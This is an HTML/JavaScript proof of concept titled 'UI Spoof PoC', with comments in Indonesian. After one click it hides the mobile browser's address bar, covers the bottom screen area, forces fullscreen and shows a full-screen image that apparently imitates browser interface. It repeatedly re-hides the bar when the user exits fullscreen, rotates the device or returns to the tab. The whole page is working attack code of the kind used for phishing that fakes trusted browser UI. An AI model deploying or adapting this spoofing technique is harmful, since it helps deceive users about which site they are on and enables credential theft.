<!DOCTYPE html>
<html lang="en">
<head>
  <title>UI Spoof PoC</title>
  <meta charset="utf-8">
  <meta name="viewport"
        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>

  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 300vh; /* wajib panjang */
      background: #000;
      font-family: system-ui, sans-serif;
      overscroll-behavior: none;
    }

    /* layer utama */
    #spoof {
      position: fixed;
      inset: 0;
      width: 100vw;
      height: 100vh;
      object-fit: contain;
      background: #000;
      display: none;
      z-index: 9999;
    }

    #content {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      text-align: center;
      z-index: 10;
    }

    /* penutup area bottom (safe area / omnibar) */
    #bottomCover {
      position: fixed;
      left: 0;
      right: 0;
      bottom: 0;
      height: env(safe-area-inset-bottom, 24px);
      background: #000;
      z-index: 10000;
      pointer-events: none;
    }
  </style>
</head>

<body>

<img id="spoof" src="spof3.png" alt="spoof-ui">

<div id="content">
  <h1>Click anywhere</h1>
</div>

<div id="bottomCover"></div>

<script>
let once = false;

function hideOmnibarHard() {
  let i = 0;
  function loop() {
    window.scrollTo(0, 1); // JANGAN PERNAH 0
    if (++i < 50) requestAnimationFrame(loop);
  }
  loop();
}

onclick = () => {
  if (once) return;
  once = true;

  hideOmnibarHard();

  content.style.display = "none";
  spoof.style.display = "block";

  document.documentElement.requestFullscreen?.().catch(()=>{});
};

// keluar fullscreen
document.addEventListener("fullscreenchange", () => {
  if (!document.fullscreenElement) {
    setTimeout(hideOmnibarHard, 0);
    setTimeout(hideOmnibarHard, 150);
    setTimeout(hideOmnibarHard, 400);
    setTimeout(hideOmnibarHard, 800);
  }
});

// fallback brutal
window.addEventListener("resize", hideOmnibarHard);
window.addEventListener("orientationchange", hideOmnibarHard);
document.addEventListener("visibilitychange", () => {
  if (!document.hidden) hideOmnibarHard();
});
</script>

</body>
</html>
